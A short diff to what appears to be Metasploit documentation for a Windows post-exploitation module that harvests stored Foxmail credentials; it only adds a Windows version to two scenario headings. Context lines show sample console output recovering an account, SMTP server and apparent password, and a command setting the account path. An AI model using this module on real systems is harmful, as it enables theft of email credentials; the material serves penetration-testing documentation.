@@ -14,7 +14,7 @@
   - Specifies the account directory path for Foxmail
 
 ## Scenarios
-### FoxMail 7.2 on Windows
+### FoxMail 7.2 on Windows 10 v1903
 ```
 [*] Search account files on C:\Foxmail 7.2\Storage
 [+] Parsing configuration file: 'C:\Foxmail 7.2\Storage\kali-team@qq.com\Accounts\Account.rec0', please wait.
@@ -31,7 +31,7 @@ kali-team@qq.com            smtp.qq.com              465   true   fjcqkkeqbuwedd
 
 ```
 
-### FoxMail 7.2 on Windows, with ACCOUNT_PATH specified
+### FoxMail 7.2 on Windows 10 v1903, with ACCOUNT_PATH specified
 
 ```
 msf6 post(windows/gather/credentials/foxmail) > set account_path "C:\Foxmail 7.2\Storage\"
